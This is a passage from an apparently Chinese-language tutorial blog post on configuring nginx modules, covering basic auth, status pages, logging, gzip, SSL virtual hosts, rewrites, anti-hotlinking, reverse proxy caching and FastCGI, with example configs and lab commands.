用户认证模块</h2><p>实现基于用户的访问控制，使用basic机制进行用户认证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># mkdir /data/www/admin/</span><br><span class="line"># echo admin area &gt; /data/www/admin/index.html</span><br><span class="line">    server &#123;</span><br><span class="line">        listen 80 default_server;</span><br><span class="line">        server_name www.fenghong.tech;</span><br><span class="line">        root /data/www/;</span><br><span class="line">        location /admin &#123;</span><br><span class="line">            auth_basic &quot;Admin Area&quot;;</span><br><span class="line">            auth_basic_user_file /etc/nginx/.ngxpasswd;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"># yum install httpd-tools -y</span><br><span class="line"># htpasswd -cm /etc/nginx/.ngxpasswd user1</span><br><span class="line"># htpasswd -m /etc/nginx/.ngxpasswd user2</span><br><span class="line"># nginx -s reload</span><br><span class="line">浏览器访问：http://192.168.0.8/admin/  测试</span><br></pre></td></tr></table></figure><h2 id="ngx-http-stub-status-module-服务器状态信息模块"><a href="#ngx-http-stub-status-module-服务器状态信息模块" class="headerlink" title="ngx_http_stub_status_module 服务器状态信息模块"></a>ngx_http_stub_status_module 服务器状态信息模块</h2><p>用于输出nginx的基本状态信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    server_name www.fenghong.tech;</span><br><span class="line">    root /data/www/;</span><br><span class="line">    location /admin &#123;</span><br><span class="line">        auth_basic &quot;Admin Area&quot;;</span><br><span class="line">        auth_basic_user_file /etc/nginx/.ngxpasswd;</span><br><span class="line">    &#125;</span><br><span class="line">    location /status &#123;</span><br><span class="line">        stub_status;</span><br><span class="line">        allow 192.168.0.0/24;</span><br><span class="line">        deny all;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">]# curl http://192.168.0.8/status/</span><br><span class="line">Active connections: 3 </span><br><span class="line">server accepts handled requests</span><br><span class="line">       35      35      34</span><br><span class="line">Reading: 0 Writing: 1 Waiting: 2</span><br></pre></td></tr></table></figure><blockquote><p>Active connections：当前状态，活动状态的连接数<br>accepts：统计总值，已经接受的客户端请求的总数<br>handled：统计总值，已经处理完成的客户端请求的总数<br>requests：统计总值，客户端发来的总的请求数<br>Reading：当前状态，正在读取客户端请求报文首部的连接的连接数<br>Writing：当前状态，正在向客户端发送响应报文过程中的连接数<br>Waiting：当前状态，正在等待客户端发出请求的空闲连接数</p></blockquote><h2 id="ngx-http-log-module-日志模块"><a href="#ngx-http-log-module-日志模块" class="headerlink" title="ngx_http_log_module 日志模块"></a>ngx_http_log_module 日志模块</h2><p>指定日志格式记录请求</p><p>1）log_format name string …</p><p>string可以使用nginx核心模块及其它模块内嵌的变量</p><p>2）access_log path [format [buffer=size][gzip[=level]][flush=time][if=condition]] 或 access_log off</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">   log_format  customlog  &apos;$remote_addr - $remote_user [$time_iso8601] &quot;$request&quot; &apos;</span><br><span class="line">                 &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                 &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line">   server &#123;</span><br><span class="line">        listen 80 default_server;</span><br><span class="line">        server_name www.fenghong.tech;</span><br><span class="line">        root /data/www/;</span><br><span class="line">        access_log /var/log/nginx/www.fenghong.tech-access.log customlog buffer=32k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3）open_log_file_cache max=N [inactive=time][min_uses=N][valid=time]; 和 open_log_file_cache off; </p><p>缓存各日志文件相关的元数据信息</p><blockquote><p>max：缓存的最大文件描述符数量<br>min_uses：在inactive指定的时长内访问大于等于此值方可被当作活动项<br>inactive：非活动时长<br>valid：验证缓存中各缓存项是否为活动项的时间间隔 </p></blockquote><h2 id="ngx-http-gzip-module-压缩传输模块"><a href="#ngx-http-gzip-module-压缩传输模块" class="headerlink" title="ngx_http_gzip_module 压缩传输模块"></a>ngx_http_gzip_module 压缩传输模块</h2><p>用gzip方法压缩响应数据，节约带宽</p><p>1）gzip on | off; 启用或禁用gzip压缩 </p><p>2）gzip_comp_level level; 压缩比由低到高：1 到 9 ，默认：1</p><p>3）gzip_disable regex …; 匹配到客户端浏览器不执行压缩</p><p>4）gzip_min_length length; 启用压缩功能的响应报文大小阈值</p><p>5）gzip_http_version 1.0 | 1.1; 设定启用压缩功能时，协议的最小版本，默认：1.1 </p><p>6）gzip_buffers number size; 支持实现压缩功能时缓冲区数量及每个缓存区的大小，默认：32 4k 或 16 8k </p><p>7）gzip_types mime-type …; 指明仅对哪些类型的资源执行压缩操作；即压缩过滤器，默认包含有text/html，不用显示指定，否则出错</p><p>8）gzip_vary on | off; 如果启用压缩，是否在响应报文首部插入“Vary: Accept-Encoding”</p><p>9）gzip_proxied off | expired | no-cache | no-store | private | no_last_modified | no_etag | auth | any …;</p><p>nginx充当代理服务器时，对于后端服务器的响应报文，在何种条件下启用压缩功能</p><ul><li>off：不启用压缩</li><li>expired，no-cache, no-store，private：对后端服务器的响应报文首部Cache-Control值任何一个，启用压缩功能</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    server_name www.fenghong.tech;</span><br><span class="line">    root /data/www/;</span><br><span class="line">    gzip on;</span><br><span class="line">    gzip_comp_level 6;</span><br><span class="line">    gzip_min_length 64;</span><br><span class="line">    gzip_proxied any;</span><br><span class="line">    gzip_types text/xml text/css text/plain application/javascript;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ngx-http-ssl-module-加密传输模块"><a href="#ngx-http-ssl-module-加密传输模块" class="headerlink" title="ngx_http_ssl_module 加密传输模块"></a>ngx_http_ssl_module 加密传输模块</h2><p>1）ssl on|off; 为指定虚拟机启用HTTPS protocol， 建议用listen指令代替</p><p>2）ssl_certificate file; 当前虚拟主机使用PEM格式的证书文件 </p><p>3）ssl_certificate_key file; 当前虚拟主机上与其证书匹配的私钥文件</p><p>4）ssl_protocols [SSLv2][SSLv3][TLSv1][TLSv1.1][TLSv1.2]; 支持ssl协议版本，默认为后三个</p><p>5）ssl_session_cache off | none | [builtin[:size]][shared:name:size]; </p><ul><li>none:  通知客户端支持ssl session cache，但实际不支持 </li><li>builtin[:size]：使用OpenSSL内建缓存，为每worker进程私有 </li><li>[shared:name:size]：在各worker之间使用一个共享的缓存</li></ul><p>6）ssl_session_timeout time; 客户端连接可以复用ssl session cache中缓存的ssl参数的有效时长，默认5m</p><p>服务器配置示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">[root@nginx ~]# cd /etc/pki/tls/certs/</span><br><span class="line">[root@nginx certs]# vim Makefile</span><br><span class="line">%.key:</span><br><span class="line">    umask 77 ; \</span><br><span class="line">    /usr/bin/openssl genrsa $(KEYLEN) &gt; $@</span><br><span class="line">[root@nginx certs]# make aa.crt</span><br><span class="line">Country Name (2 letter code) [XX]:CN</span><br><span class="line">State or Province Name (full name) []:bj</span><br><span class="line">Locality Name (eg, city) [Default City]:bj</span><br><span class="line">Organization Name (eg, company) [Default Company Ltd]:aa.com</span><br><span class="line">Organizational Unit Name (eg, section) []:opt</span><br><span class="line">Common Name (eg, your name or your server&apos;s hostname) []:www.aa.com</span><br><span class="line">[root@nginx certs]# make bb.crt</span><br><span class="line">Country Name (2 letter code) [XX]:CN</span><br><span class="line">State or Province Name (full name) []:bj</span><br><span class="line">Locality Name (eg, city) [Default City]:bj</span><br><span class="line">Organization Name (eg, company) [Default Company Ltd]:bb.com</span><br><span class="line">Organizational Unit Name (eg, section) []:opt</span><br><span class="line">Common Name (eg, your name or your server&apos;s hostname) []:www.bb.com</span><br><span class="line">[root@nginx certs]# mkdir /etc/nginx/conf.d/ssl/</span><br><span class="line">[root@nginx certs]# mv aa.crt aa.key bb.crt bb.key /etc/nginx/conf.d/ssl/</span><br><span class="line">[root@nginx ~]# vim /etc/nginx/conf.d/vhosts.conf</span><br><span class="line">server &#123;</span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    server_name www.aa.com;</span><br><span class="line">    root /data/www/aa/;</span><br><span class="line">    ssl_certificate /etc/nginx/conf.d/ssl/aa.crt;</span><br><span class="line">    ssl_certificate_key /etc/nginx/conf.d/ssl/aa.key;</span><br><span class="line">    ssl_session_cache shared:sslcache:20m;</span><br><span class="line">    ssl_session_timeout 10m;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    server_name www.bb.com;</span><br><span class="line">    root /data/www/bb/;</span><br><span class="line">    ssl_certificate /etc/nginx/conf.d/ssl/bb.crt;</span><br><span class="line">    ssl_certificate_key /etc/nginx/conf.d/ssl/bb.key;</span><br><span class="line">    ssl_session_cache shared:sslcache:20m;</span><br><span class="line">    ssl_session_timeout 10m;</span><br><span class="line">&#125;</span><br><span class="line">[root@nginx ~]# mkdir -pv /data/www/&#123;aa,bb&#125;</span><br><span class="line">[root@nginx ~]# echo &quot;aa test page&quot; &gt; /data/www/aa/index.html</span><br><span class="line">[root@nginx ~]# echo &quot;bb test page&quot; &gt; /data/www/bb/index.html</span><br><span class="line">[root@nginx ~]# nginx</span><br></pre></td></tr></table></figure><p>客户端测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@client ~]# vim /etc/hosts</span><br><span class="line">192.168.0.8 www.aa.com www.bb.com</span><br><span class="line">[root@client ~]# curl -k https://www.aa.com/</span><br><span class="line">aa test page</span><br><span class="line">[root@client ~]# curl -k https://www.bb.com/</span><br><span class="line">bb test page</span><br></pre></td></tr></table></figure><h2 id="ngx-http-rewrite-module-URI重写模块"><a href="#ngx-http-rewrite-module-URI重写模块" class="headerlink" title="ngx_http_rewrite_module URI重写模块"></a>ngx_http_rewrite_module URI重写模块</h2><p>将用户请求的URI基于PCRE regex所描述的模式进行检查，而后完成重定向替换</p><p>1）<strong>rewrite</strong> regex replacement [flag]</p><p>将用户请求的URI基于regex所描述的模式进行检查，匹配到时将其替换为replacement指定的新的URI</p><p>如果在同一级配置块中存在多个rewrite规则，那么会自下而下逐个检查；被某条件规则替换完成后，会重新一轮的替换检查</p><p>隐含有循环机制,但不超过10次；如果超过，提示500响应码，[flag]所表示的标志位用于控制此循环机制</p><p>如果replacement是以http://或https://开头，则替换结果会直接以重向返回给客户端,  即永久重定向301</p><p>[flag]：</p><ul><li>last：重写完成后停止对当前URI在当前location中后续的其它重写操作，而后对新的URI启动新一轮重写检查；提前重启新一轮循环，不建议在location中使用</li><li>break：重写完成后停止对当前URI在当前location中后续的其它重写操作，而后直接跳转至重写规则配置块之后的其它配置；结束循环，建议在location中使用</li><li>redirect：临时重定向，重写完成后以临时重定向方式直接返回重写后生成的新URI给客户端，由客户端重新发起请求；使用相对路径,或者http://或https://开头，状态码：302</li><li>permanent:重写完成后以永久重定向方式直接返回重写后生成的新URI给客户端，由客户端重新发起请求，状态码：301</li></ul><p>2）<strong>return</strong></p><p>return code [text];</p><p>return code URL;</p><p>return URL;</p><p>停止处理，并返回给客户端指定的响应码</p><p>3）<strong>rewrite_log</strong> on | off;</p><p>是否开启重写日志, 发送至error_log（notice level） </p><p>4）<strong>set</strong> $variable value;</p><p>用户自定义变量；注意：变量定义和调用都要以$开头</p><p>5）<strong>if (condition) { … }</strong></p><p>条件满足时，执行配置块中的配置指令；server, location</p><p>condition：</p><ul><li>=  相同    !=   不同 </li><li>~：模式匹配，区分字符大小写 </li><li>~*：模式匹配，不区分字符大小写 </li><li>!~：模式不匹配，区分字符大小写 </li><li>!~*：模式不匹配，不区分字符大小写 </li><li>-e, !-e 存在（包括文件，目录，软链接） </li><li>-f, !-f  文件   -d, !-d  目录   -x, !-x  执行 </li></ul><p>实现http重定向到https</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    server_name www.aa.com;</span><br><span class="line">    root /data/www/aa;</span><br><span class="line">    ssl_certificate /etc/nginx/conf.d/ssl/aa.crt;</span><br><span class="line">    ssl_certificate_key /etc/nginx/conf.d/ssl/aa.key;</span><br><span class="line">    ssl_session_cache shared:sslcache:20m;</span><br><span class="line">    ssl_session_timeout 10m;</span><br><span class="line">    location / &#123;</span><br><span class="line">        if ( $scheme = http ) &#123;</span><br><span class="line">            rewrite / https://www.aa.com/ redirect;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ngx-http-referer-module-模块"><a href="#ngx-http-referer-module-模块" class="headerlink" title="ngx_http_referer_module 模块"></a>ngx_http_referer_module 模块</h2><p>用来阻止Referer首部无有效值的请求访问，可防止盗链</p><p><strong>valid_referers</strong> none|blocked|server_names|string …;  定义referer首部的合法可用值，不能匹配的将是非法值</p><ul><li>none：请求报文首部没有referer首部</li><li>blocked：请求报文有referer首部，但无有效值</li><li>server_names：参数，其可以有值作为主机名或主机名模式</li><li>arbitrary_string：任意字符串，但可使用*作通配符</li><li>regular expression：被指定的正则表达式模式匹配到的字符串,要使用~开头，例如： ~.*\.fenghong\.com</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@nginx ~]# cp /usr/share/backgrounds/night.jpg /data/www/aa/</span><br><span class="line">[root@nginx ~]# vim /data/www/bb/index.html</span><br><span class="line">bb test page</span><br><span class="line">&lt;img src=http://www.aa.com/night.jpg&gt;  #bb.com网站盗链aa.com网站图片</span><br><span class="line">[root@nginx ~]# vim /etc/nginx/conf.d/vhosts.conf</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name www.aa.com;</span><br><span class="line">    root /data/www/aa;</span><br><span class="line">    valid_referers none block server_names *.aa.com ~\.aa\.;  #只有从aa.com访问的才可以浏览</span><br><span class="line">    if  ($invalid_referer)  &#123;</span><br><span class="line">        return 403  http://www.aa.com;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name www.bb.com;</span><br><span class="line">    root /data/www/bb/;</span><br><span class="line">&#125;</span><br><span class="line">现在访问www.bb.com无法获取aa.com的图片了</span><br></pre></td></tr></table></figure><h2 id="ngx-http-proxy-module-反向代理模块"><a href="#ngx-http-proxy-module-反向代理模块" class="headerlink" title="ngx_http_proxy_module 反向代理模块"></a>ngx_http_proxy_module 反向代理模块</h2><p>反向代理：转发请求至另一台主机</p><p>1）<strong>proxy_pass</strong> URL; proxy_pass后面路径不带uri时，会将location的uri传递（附加）给后端主机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name www.aa.com;</span><br><span class="line">    location /admin &#123;</span><br><span class="line">        proxy_pass http://192.168.0.9/;  #带&quot; / &quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">访问http://www.aa.com时相当于访问 http://192.168.0.9/</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name www.aa.com;</span><br><span class="line">    location /admin &#123;</span><br><span class="line">        proxy_pass http://192.168.0.9;  #不带&quot; / &quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">访问http://www.aa.com时相当于访问 http://192.168.0.9/admin</span><br></pre></td></tr></table></figure><blockquote><p>如果location定义其uri时使用了正则表达式的模式，则proxy_pass之后必须不能使用uri; 用户请求时传递的uri将直接附加至后端服务器之后</p></blockquote><p>2）<strong>proxy_set_header</strong> field value; 设定发往后端主机的请求报文的请求首部的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxy_set_header X-Real-IP  $remote_addr;  #$remote_addr客户端IP</span><br><span class="line">proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;  #$proxy_add_x_forwarded_for代理IP</span><br></pre></td></tr></table></figure><p>配合日志记录实现后端web服务器记录真正的客户端地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@nginx ~]# vim /etc/nginx/conf.d/vhosts.conf</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    server_name www.aa.com;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://192.168.0.9/;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@nginx-1 ~]# vim /etc/nginx/nginx.conf</span><br><span class="line">listen       80;</span><br><span class="line">listen       [::]:80;</span><br><span class="line">log_format  mylogformat  &apos;$http_x_forwarded_for - $remote_user [$time_iso8601] &quot;$request&quot; &apos;</span><br><span class="line">                  &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                  &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line">[root@nginx-1 ~]# vim /etc/nginx/conf.d/vhosts.conf</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    server_name www.aa.com;</span><br><span class="line">    root /data/www/aa/;</span><br><span class="line">    access_log /var/log/nginx/www.aa.com-access.log mylogformat;</span><br><span class="line">&#125;</span><br><span class="line">root@nginx-1 ~]# mkdir -pv /data/www/aa/</span><br><span class="line">[root@nginx-1 ~]# echo www.aa.com test page on nginx-1 &gt; /data/www/aa/index.html</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@nginx-2 ~]# curl www.aa.com</span><br><span class="line">www.aa.com test page on nginx-1</span><br><span class="line">[root@nginx-1 ~]# tail -f /var/log/nginx/www.aa.com-access.log</span><br><span class="line">192.168.0.10 - - [2018-07-07T14:34:07+08:00] &quot;GET / HTTP/1.0&quot; 200 32 &quot;-&quot; &quot;curl/7.29.0&quot; &quot;192.168.0.10&quot;  #显示的是真正的客户端的IP地址</span><br></pre></td></tr></table></figure><p>3）proxy_cache_path; 定义可用于proxy功能的缓存，在http中定义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy_cache_path path [levels=levels] [use_temp_path=on|off] keys_zone=name:size [inactive=time] [max_size=size] [manager_files=number] [manager_sleep=time] [manager_threshold=time] [loader_files=number] [loader_sleep=time] [loader_threshold=time] [purger=on|off] [purger_files=number] [purger_sleep=time] [purger_threshold=time];</span><br></pre></td></tr></table></figure><p>配置代理缓存示例：在http配置定义缓存信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@nginx ~]# vim /etc/nginx/nginx.conf</span><br><span class="line">proxy_cache_path /var/cache/nginx/proxy_cache levels=1:1:1 keys_zone=proxycache:20m inactive=120s max_size=1g;</span><br><span class="line">[root@nginx ~]# mkdir /var/cache/nginx/</span><br></pre></td></tr></table></figure><blockquote><p>proxycache:20m  指内存中缓存的大小，主要用于存放key和metadata</p><p>max_size=1g  指磁盘存入文件内容的缓存空间最大值</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@nginx ~]# vim /etc/nginx/conf.d/vhosts.conf</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    server_name www.aa.com;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://192.168.0.9/;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_cache proxycache;</span><br><span class="line">        proxy_cache_key $request_uri;</span><br><span class="line">        proxy_cache_valid 200 302 301 1h;</span><br><span class="line">        proxy_cache_valid any 1m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@nginx ~]# tree /var/cache/nginx/proxy_cache/</span><br><span class="line">/var/cache/nginx/proxy_cache/</span><br><span class="line">└── 9</span><br><span class="line">    └── d</span><br><span class="line">        └── 7</span><br><span class="line">            └── 6666cd76f96956469e7be39d750cc7d9</span><br></pre></td></tr></table></figure><p>4）proxy_cache zone|off;  默认off ，指明调用的缓存，或关闭缓存机制</p><p>5）proxy_cache_key string; 缓存中用于“键”的内容</p><p>默认值：proxy_cache_key \$scheme\$proxy_host\$request_uri; </p><p>6）proxy_cache_valid [code …] time; 定义对特定响应码的响应内容的缓存时长，定义在http{…}中</p><p>7）proxy_cache_use_stale; 在被代理的后端服务器出现哪种情况下，可以真接使用过期的缓存响应客户端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy_cache_use_stale error | timeout | invalid_header | updating | http_500 | http_502 | http_503 | http_504 | http_403 | http_404 | off ...</span><br></pre></td></tr></table></figure><p>8）proxy_cache_methods GET | HEAD | POST …; 对哪些客户端请求方法对应的响应进行缓存，GET和HEAD方法总是被缓存</p><p>9）proxy_hide_header field; 默认nginx在响应报文不传递后端服务器的首部字段Date, Server, X-Pad, X-Accel-等，用于隐藏后端服务器特定的响应首部</p><p>10）proxy_connect_timeout time; 定义与后端服务器建立连接的超时时长，如超时会出现502错误，默认为60s，一般不建议超出75s</p><p>11）proxy_send_timeout time; 将请求发送给后端服务器的超时时长；默认为60s</p><p>12）proxy_read_timeout time; 等待后端服务器发送响应报文的超时时长，默认为60s</p><h2 id="ngx-http-headers-module-模块"><a href="#ngx-http-headers-module-模块" class="headerlink" title="ngx_http_headers_module 模块"></a>ngx_http_headers_module 模块</h2><p>向由代理服务器响应给客户端的响应报文添加自定义首部，或修改指定首部的值</p><p>1）add_header name value [always]; 添加自定义首部</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add_header X-Via  $server_addr;</span><br><span class="line">add_header X-Cache $upstream_cache_status;</span><br><span class="line">add_header X-Accel $server_name;</span><br></pre></td></tr></table></figure><p>2）add_trailer name value [always]; 添加自定义响应信息的尾部</p><h2 id="ngx-http-fastcgi-module-模块"><a href="#ngx-http-fastcgi-module-模块" class="headerlink" title="ngx_http_fastcgi_module 模块"></a>ngx_http_fastcgi_module 模块</h2><p>转发请求到FastCGI服务器，不支持php模块方式</p><p>1）fastcgi_pass address; address为后端的fastcgi server的地址；可用位置：location, if in location</p><p>2）fastcgi_index name; fastcgi默认的主页资源；<code>fastcgi_index index.php;</code></p><p>3）fastcgi_param parameter value [if_not_empty]; 设置传递给 FastCGI服务器的参数值，可以是文本，变量或组合</p><p>4）fastcgi_cache_path path … 定义fastcgi的缓存：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcgi_cache_path path [levels=levels] [use_temp_path=on|off] keys_zone=name:size [inactive=time] [max_size=size] [manager_files=number] [manager_sleep=time] [manager_threshold=time] [loader_files=number] [loader_sleep=time] [loader_threshold=time][purger=on|off] [purger_files=number] [purger_sleep=time] [purger_threshold=time];</span><br></pre></td></tr></table></figure><blockquote><p>path：缓存位置为磁盘上的文件系统<br>max_size=size：磁盘path路径中用于缓存数据的缓存空间上限<br>levels=levels：缓存目录的层级数量，以及每一级的目录数量<br>levels=ONE:TWO:THREE：示例：leves=1:2:2<br>keys_zone=name:size：k/v映射的内存空间的名称及大小<br>inactive=time：非活动时长 </p></blockquote><p>5）fastcgi_cache zone|off; 调用指定的缓存空间来缓存数据，可用位置：http, server, location</p><p>6）fastcgi_cache_key string; 定义用作缓存项的key的字符串，示例：fastcgi_cache_key $request_rui;</p><p>7）fastcgi_cache_methods GET | HEAD | POST …; 为哪些请求方法使用缓存</p><p>8）fastcgi_cache_min_uses number; 缓存空间中的缓存项在inactive定义的非活动时间内至少要被访问到此处所指定的次数方可被认作活动项</p><p>9）fastcgi_keep_conn on | off; 收到后端服务器响应后，fastcgi服务器是否关闭连接，建议启用长连接</p><p>10）fastcgi_cache_valid [code …] time; 不同的响应码各自的缓存时长</p><p>示例：配置 <strong>lnmp</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 